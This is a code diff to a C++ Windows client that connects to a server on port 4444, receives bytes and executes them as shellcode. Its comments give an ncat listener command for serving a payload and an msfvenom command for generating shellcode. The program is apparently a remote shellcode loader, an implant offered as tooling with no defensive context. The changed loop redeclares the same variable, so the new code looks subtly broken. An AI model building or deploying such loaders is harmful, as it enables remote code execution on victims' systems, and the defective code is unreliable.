@@ -20,14 +20,11 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-//#define SERVER_IP "10.0.0.86"  // Localhost for testing
-#define SERVER_IP "172.18.245.234"
-#define SERVER_PORT 4444
 #define BUFFER_SIZE 1024
 
-
 // TODO: -static makes file 2-5x larger
-// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 
+// x86_64-w64-mingw32-g++ -o client.exe client.cpp -lws2_32 
+// ncat -lvp 4444 --send-only < payload.bin
 //
 // # Generate 64-bit shellcode
 // msfvenom -p windows/x64/exec CMD="path/to/custom.exe" -f c
@@ -299,25 +296,21 @@ void Client::run(const std::string& host, const std::string& port)
     
     // Wait for incoming data from server
     while (connected_) {
-        try {
-            //std::string command = receiveData();
-            auto command = receiveData();
-            executeShellcode(command);
-
-                //
-                // sendData(command);
-				/*
-                if (command == "exec")
-                {
-                    std::cout << "poop" << command << std::endl;
-                    execute();
-                }
-				else
-				{
-                    executeShellcode(command);
-				}*/
-                //std::cout << "Server command: " << command << std::endl;
-            } catch (const std::exception& e) {
+		try {
+			std::vector<unsigned char> command = receiveData();
+			auto command = receiveData();
+			if (!command.empty())
+			{
+				executeShellcode(command);
+			}
+			else
+			{
+				// TODO: throw error
+				// sendData("error");
+			}
+		} 
+		catch (const std::exception& e) 
+		{
             std::cerr << "Connection lost: " << e.what() << std::endl;
             break;
         }
